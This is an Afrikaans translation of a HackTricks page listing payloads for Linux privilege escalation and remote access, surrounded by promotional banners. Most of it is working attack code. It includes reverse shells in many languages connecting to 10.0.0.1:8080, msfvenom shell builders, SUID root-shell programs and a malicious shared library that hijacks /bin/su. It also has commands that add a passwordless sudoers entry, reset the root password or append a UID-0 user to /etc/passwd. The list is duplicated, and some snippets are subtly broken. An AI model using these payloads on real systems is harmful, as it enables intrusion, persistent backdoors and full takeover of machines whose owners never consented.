# Vervullings om uit te voer

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## Uitvoeringsladinge

Hier is 'n lys van nuttige uitvoeringsladinge wat gebruik kan word vir voorregverhoging in Linux-stelsels:

### Bash

```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```php
php -r '$sock=fsockopen("10.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```bash
nc -e /bin/sh 10.0.0.1 8080
```

### Socat

```bash
socat tcp-connect:10.0.0.1:8080 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### xterm

```bash
xterm -display 10.0.0.1:1
```

### PowerShell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Metasploit

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f elf > shell.elf
```

### Socat (Metasploit)

```bash
msfvenom -p cmd/unix/reverse_socat LHOST=10.0.0.1 LPORT=8080 -f elf > shell.elf
```

### Python (Metasploit)

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.1 LPORT=8080 -f raw > shell.py
```

### PHP (Metasploit)

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f raw > shell.php
```

### Ruby (Metasploit)

```bash
msfvenom -p cmd/unix/reverse_ruby LHOST=10.0.0.1 LPORT=8080 -f raw > shell.rb
```

### Netcat (Metasploit)

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.1 LPORT=8080 -f raw > shell.sh
```

### Java (Metasploit)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f raw > shell.jsp
```

### War (Metasploit)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f war > shell.war
```

### Python (PentestMonkey)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP (PentestMonkey)

```php
php -r '$sock=fsockopen("10.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby (PentestMonkey)

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat (PentestMonkey)

```bash
nc -e /bin/sh 10.0.0.1 8080
```

### Socat (PentestMonkey)

```bash
socat tcp-connect:10.0.0.1:8080 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

### Java (PentestMonkey)

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### xterm (PentestMonkey)

```bash
xterm -display 10.0.0.1:1
```

### PowerShell (PentestMonkey)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Metasploit (PentestMonkey)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f elf > shell.elf
```

### Socat (Metasploit) (PentestMonkey)

```bash
msfvenom -p cmd/unix/reverse_socat LHOST=10.0.0.1 LPORT=8080 -f elf > shell.elf
```

### Python (Metasploit) (PentestMonkey)

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.1 LPORT=8080 -f raw > shell.py
```

### PHP (Metasploit) (PentestMonkey)

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f raw > shell.php
```

### Ruby (Metasploit) (PentestMonkey)

```bash
msfvenom -p cmd/unix/reverse_ruby LHOST=10.0.0.1 LPORT=8080 -f raw > shell.rb
```

### Netcat (Metasploit) (PentestMonkey)

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.1 LPORT=8080 -f raw > shell.sh
```

### Java (Metasploit) (PentestMonkey)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f raw > shell.jsp
```

### War (Metasploit) (PentestMonkey)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 -f war > shell.war
```
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Oorskryf 'n lêer om voorregte te verhoog

### Gewone lêers

* Voeg 'n gebruiker met 'n wagwoord by in _/etc/passwd_
* Verander die wagwoord binne _/etc/shadow_
* Voeg 'n gebruiker by in sudoers in _/etc/sudoers_
* Misbruik docker deur die docker-socket, gewoonlik in _/run/docker.sock_ of _/var/run/docker.sock_

### Oorskryf 'n biblioteek

Kyk na 'n biblioteek wat deur 'n sekere binêre lêer gebruik word, in hierdie geval `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
In hierdie geval gaan ons probeer om `/lib/x86_64-linux-gnu/libaudit.so.1` na te boots.\
Dus, kyk vir funksies van hierdie biblioteek wat deur die **`su`** binêre lêer gebruik word:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Die simbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` en `audit_fd` is waarskynlik afkomstig van die libaudit.so.1-biblioteek. Aangesien die libaudit.so.1 oorskryf sal word deur die skadelike gedeelde biblioteek, moet hierdie simbole teenwoordig wees in die nuwe gedeelde biblioteek, anders sal die program nie in staat wees om die simbool te vind en sal dit afsluit.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Nou, deur eenvoudig **`/bin/su`** te roep, sal jy 'n skul as root verkry.

## Skripte

Kan jy maak dat root iets uitvoer?

### **www-data na sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Verander root wagwoord**
```bash
echo "root:hacked" | chpasswd
```
### Voeg 'n nuwe root-gebruiker by in /etc/passwd

```bash
echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
